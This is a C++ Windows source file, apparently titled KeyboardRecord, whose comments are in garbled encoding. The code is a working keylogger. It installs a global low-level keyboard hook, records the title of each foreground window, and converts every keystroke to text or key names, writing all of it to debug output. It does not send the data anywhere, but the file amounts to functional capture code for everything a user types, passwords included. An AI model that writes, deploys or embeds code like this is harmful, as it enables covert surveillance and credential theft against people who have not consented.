// KeyboardRecord.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"

#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <stdio.h>
#include <tchar.h>

HHOOK g_hLLKeyboardHook = NULL;
char g_szNewTitleName[255] = { 0 };
char g_szOldTitleName[255] = { 0 };

#ifdef WH_KEYBOARD_LL
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
	CHAR szDebug[256];

	if (nCode == HC_ACTION)
	{
		PKBDLLHOOKSTRUCT pKeyboardHookStruct = (PKBDLLHOOKSTRUCT)lParam;

		if ((wParam == WM_KEYDOWN) || (wParam == WM_SYSKEYDOWN))
		{
			HWND hWnd = GetForegroundWindow();						//ȡ�õ�ǰ����ڵľ��
			GetWindowTextA(hWnd, g_szNewTitleName, 100);			//ȡ�õ�ǰ����ڵ�����

			if (strcmp(g_szNewTitleName, g_szOldTitleName) != 0)
			{
				memset(g_szOldTitleName, 0, 255);
				strcpy(g_szOldTitleName, g_szNewTitleName);
				OutputDebugStringA(g_szNewTitleName);
			}


			BYTE KeyboardState[256];
			ZeroMemory(KeyboardState, sizeof(KeyboardState));
			GetKeyboardState(KeyboardState);

			KeyboardState[VK_SHIFT] = (BYTE)(GetKeyState(VK_LSHIFT) | GetKeyState(VK_RSHIFT));
			KeyboardState[VK_CAPITAL] = (BYTE)GetKeyState(VK_CAPITAL);

			WORD wChar;


			//_snprintf(szDebug, 255, "vkCode = %d\n", pKeyboardHookStruct->vkCode);
			//OutputDebugStringA(szDebug);


			if (96 <= pKeyboardHookStruct->vkCode &&  pKeyboardHookStruct->vkCode <= 105)
			{
				_snprintf(szDebug, 255, "���� %d", pKeyboardHookStruct->vkCode - 96);
				OutputDebugStringA(szDebug);
			}
			else
			{

				int iNumChar = ToAscii(pKeyboardHookStruct->vkCode, pKeyboardHookStruct->scanCode, KeyboardState, &wChar, 0);

				if (iNumChar >= 1)
				{
					_snprintf(szDebug, 255, "%c", wChar);
					OutputDebugStringA(szDebug);
				}

				if (iNumChar <= 0)
				{
					CHAR KeyText[20];
					ZeroMemory(KeyText, sizeof(KeyText));

					LONG Flags = 0;
					Flags = pKeyboardHookStruct->scanCode << 16;
					Flags |= pKeyboardHookStruct->flags << 24;

					if (GetKeyNameTextA(Flags, KeyText, 20) > 0)
					{
						_snprintf(szDebug, 255, "%s", KeyText);
						OutputDebugStringA(szDebug);
					}
				}


			}

		}
	}

	return CallNextHookEx(g_hLLKeyboardHook, nCode, wParam, lParam);
}
#endif

int main()
{
	g_hLLKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)LowLevelKeyboardProc, GetModuleHandle(NULL), 0);

	if (g_hLLKeyboardHook == NULL)
	{
		return -1;
	}

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	UnhookWindowsHookEx(g_hLLKeyboardHook);
    return 0;
}

